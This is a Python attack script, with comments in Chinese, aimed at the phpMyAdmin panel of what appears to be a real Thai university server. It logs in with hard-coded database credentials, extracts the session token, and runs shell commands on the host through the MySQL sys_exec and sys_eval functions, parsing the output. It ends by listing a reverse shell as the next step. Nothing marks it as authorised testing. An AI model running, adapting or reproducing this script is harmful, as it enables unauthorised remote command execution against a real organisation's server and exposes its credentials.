#!/usr/bin/env python3
import requests
import re
import urllib3
import html
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")
print("[*] MySQL用户没有FILE权限，无法写入文件")
print("[*] 尝试直接使用sys_exec执行命令获取输出...")

# 使用sys_exec执行命令
commands = [
    "id",
    "whoami",
    "pwd",
    "ls -la /var/www/html/enmeeting/",
]

for cmd in commands:
    print(f"\n[*] 执行命令: {cmd}")
    sql = f"SELECT sys_exec('{cmd}');"
    sql_data = {"sql_query": sql, "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    # 保存响应用于分析
    with open(f"/tmp/pma_resp_{cmd.replace(' ', '_').replace('/', '_')}.html", "w", encoding="utf-8", errors="ignore") as f:
        f.write(resp.text)
    
    # 解析响应
    content = resp.text
    # 查找所有可能的输出
    tds = re.findall(r'<td[^>]*>(.*?)</td>', content, re.DOTALL)
    for td in tds:
        clean = re.sub(r'<[^>]+>', '', td).strip()
        clean = html.unescape(clean)
        if clean and len(clean) > 0:
            # 检查是否是命令输出
            if "uid=" in clean or "gid=" in clean or "root" in clean.lower() or "/" in clean:
                print(f"[+] 可能的输出: {clean[:200]}")
    
    # 也查找pre标签
    pres = re.findall(r'<pre[^>]*>(.*?)</pre>', content, re.DOTALL)
    for pre in pres:
        clean = re.sub(r'<[^>]+>', '', pre).strip()
        clean = html.unescape(clean)
        if clean and len(clean) > 3:
            print(f"[+] PRE输出: {clean[:200]}")

# 尝试sys_eval（返回输出）
print("\n[*] 尝试sys_eval...")
sql = "SELECT sys_eval('id');"
sql_data = {"sql_query": sql, "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

content = resp.text
tds = re.findall(r'<td[^>]*>(.*?)</td>', content, re.DOTALL)
for td in tds:
    clean = re.sub(r'<[^>]+>', '', td).strip()
    clean = html.unescape(clean)
    if "uid=" in clean or "gid=" in clean:
        print(f"[+] sys_eval成功! 输出: {clean}")

print("\n[*] 如果sys_exec能执行命令，可以尝试:")
print("    1. 直接执行命令获取信息")
print("    2. 执行反向shell连接")
print("    3. 通过其他方式获取shell")
